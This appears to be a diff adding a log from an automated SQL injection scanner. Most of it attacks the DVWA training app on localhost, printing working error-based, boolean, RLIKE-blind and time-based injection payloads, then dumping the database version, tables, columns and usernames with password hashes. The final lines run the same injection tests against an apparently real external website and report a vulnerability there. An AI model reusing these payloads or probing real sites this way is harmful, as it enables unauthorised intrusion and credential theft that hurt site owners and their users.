@@ -1,0 +1,74 @@
+2017-03-25 12:30:27  12:30:27 Checking Form Vuln with Referer: http://localhost/dvwa/vulnerabilities/sqli/
+2017-03-25 12:30:28  Idle time more than 40s, reset HTTP Thread Number 1 ==> 0.
+2017-03-25 12:30:28  Checking Form SQLInjection: http://localhost/dvwa/vulnerabilities/sqli/?id=4509837&Submit=Submit
+2017-03-25 12:30:28  12:30:28 Checking SQL Injection, ErrorBased, Parameter: id
+2017-03-25 12:30:28  12:30:28 Found ErrorBased SQL Injection Vuln: http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit&id=4509837%27 or (select 1 from (select count(*),concat((0x574352575653),0x5E,floor(rand(0)*2)) x from information_schema.tables group by x)a) or %27
+2017-03-25 12:30:28  12:30:28 Checking SQL Injection, BooleanBased, Parameter: id
+2017-03-25 12:30:28  GET  http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit&id=4509837  Integer KeyWord=
+2017-03-25 12:30:28  GET  http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit&id=99999999  Integer KeyWord=
+2017-03-25 12:30:28  GET  http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit&id=99999999  Integer KeyWord=
+2017-03-25 12:30:28  COOKIE  http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit&^id=4509837  Integer KeyWord=
+2017-03-25 12:30:28  GET  http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit&id=4509837  String KeyWord=
+2017-03-25 12:30:28  GET  http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit&id=99999999  String KeyWord=pre
+2017-03-25 12:30:29  12:30:29 Found BooleanBased SQL Injection Vuln: http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit&id=99999999%27 oR 1354626=1354626 aNd %276199%27=%276199
+2017-03-25 12:30:29  12:30:29 Checking SQL Injection, BooleanBased Rlike Blind, Parameter: id
+2017-03-25 12:30:29  GET  http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit&id=4509837  Integer KeyWord=
+2017-03-25 12:30:29  GET  http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit&id=4509837  String KeyWord=DOCTYPE
+2017-03-25 12:30:29  12:30:29 Found BooleanBased SQL Injection Vuln: http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit&id=4509837%27 RLIKE (case when  4849874=4849874 then 0x74657374696E70757476616C7565 else 0x28 end) and '7917'='7917
+2017-03-25 12:30:29  12:30:29 Checking SQL Injection, TimeBased, Parameter: id
+2017-03-25 12:30:44  12:30:44 Found TimeBased SQL Injection Vuln: http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit&id=4509837%27 oR if(length(0x574352575653)>1,sleep(3),0) -- 
+2017-03-25 12:30:44  Checking Form XSS: http://localhost/dvwa/vulnerabilities/sqli/?id=4509837&Submit=Submit
+2017-03-25 12:30:44  End Check XSS Vuln: http://localhost/dvwa/vulnerabilities/sqli/?id=4509837&Submit=Submit
+2017-03-25 12:30:45  Checking Form LFI: http://localhost/dvwa/vulnerabilities/sqli/?id=4509837&Submit=Submit
+2017-03-25 12:30:45  Checking Form RFI: http://localhost/dvwa/vulnerabilities/sqli/?id=4509837&Submit=Submit
+2017-03-25 12:31:57  12:31:57 Got : 10.1.13-MariaDB
+2017-03-25 12:31:57  12:31:57 Got : Win32
+2017-03-25 12:31:57  12:31:57 Got : root@localhost
+2017-03-25 12:31:57  12:31:57 Got : dvwa
+2017-03-25 12:31:57  12:31:57 Got Length: 0
+2017-03-25 12:31:58  12:31:58 Got : 
+2017-03-25 12:31:58  12:31:58 Got Length: 0
+2017-03-25 12:32:29  12:32:29 Getting Tables ...
+2017-03-25 12:32:29  12:32:29 Got Table Num: 2
+2017-03-25 12:32:29  12:32:29 Got : guestbook
+2017-03-25 12:32:29  12:32:29 Got : users
+2017-03-25 12:32:43  12:32:43 Getting Columns ...
+2017-03-25 12:32:43  12:32:43 Got Column Num: 8
+2017-03-25 12:32:44  12:32:44 Got : user_id
+2017-03-25 12:32:44  12:32:44 Got : first_name
+2017-03-25 12:32:44  12:32:44 Got : last_name
+2017-03-25 12:32:44  12:32:44 Got : user
+2017-03-25 12:32:44  12:32:44 Got : password
+2017-03-25 12:32:44  12:32:44 Got : avatar
+2017-03-25 12:32:44  12:32:44 Got : last_login
+2017-03-25 12:32:44  12:32:44 Got : failed_login
+2017-03-25 12:33:06  12:33:06 Getting Data ...
+2017-03-25 12:33:06  12:33:06 Got Rows Num: 5
+2017-03-25 12:33:06  12:33:06 Got Length: 38
+2017-03-25 12:33:06  12:33:06 Got : admin^5f4dcc3b5aa765d61d8327deb882cf99
+2017-03-25 12:33:06  12:33:06 Got Length: 40
+2017-03-25 12:33:06  12:33:06 Got : gordonb^e99a18c428cb38d5f260853678922e03
+2017-03-25 12:33:27  12:33:27 Getting Data ...
+2017-03-25 12:33:27  12:33:27 Got Rows Num: 5
+2017-03-25 12:33:27  12:33:27 Got Length: 38
+2017-03-25 12:33:27  12:33:27 Got : admin^5f4dcc3b5aa765d61d8327deb882cf99
+2017-03-25 12:33:27  12:33:27 Got Length: 40
+2017-03-25 12:33:27  12:33:27 Got : gordonb^e99a18c428cb38d5f260853678922e03
+2017-03-25 12:33:27  12:33:27 Got Length: 37
+2017-03-25 12:33:27  12:33:27 Got : 1337^8d3533d75ae2c3966d7e0d4fcc69216b
+2017-03-25 12:33:27  12:33:27 Got Length: 38
+2017-03-25 12:33:28  12:33:28 Got : pablo^0d107d09f5bbe40cade3de5c71e9e9b7
+2017-03-25 12:33:28  12:33:28 Got Length: 39
+2017-03-25 12:33:28  12:33:28 Got : smithy^5f4dcc3b5aa765d61d8327deb882cf99
+2017-03-25 12:37:38  12:37:38 Checking SQL Injection: http://www.cavallo.vn/productdetail.php?id=115
+2017-03-25 12:37:39  12:37:39 Checking SQL Injection, ErrorBased, Parameter: id
+2017-03-25 12:37:40  12:37:40 Checking SQL Injection, BooleanBased, Parameter: id
+2017-03-25 12:37:42  GET  http://www.cavallo.vn/productdetail.php?id=115  Integer KeyWord=úp
+2017-03-25 12:37:42  12:37:42 Found BooleanBased SQL Injection Vuln: http://www.cavallo.vn/productdetail.php?id=115 aNd 7541851=7541851 aNd 7193=7193
+2017-03-25 12:37:42  12:37:42 Checking SQL Injection, BooleanBased Rlike Blind, Parameter: id
+2017-03-25 12:37:43  GET  http://www.cavallo.vn/productdetail.php?id=115  Integer KeyWord=
+2017-03-25 12:37:44  GET  http://www.cavallo.vn/productdetail.php?id=115  String KeyWord=
+2017-03-25 12:37:45  GET  http://www.cavallo.vn/productdetail.php?id=115  Search KeyWord=
+2017-03-25 12:37:45  12:37:45 Checking SQL Injection, TimeBased, Parameter: id
+2017-03-25 12:38:11  12:38:11 Checking Form Vuln with Referer: http://www.cavallo.vn/productdetail.php?id=115
+2017-03-25 12:38:33  Idle time more than 40s, reset HTTP Thread Number 1 ==> 0.
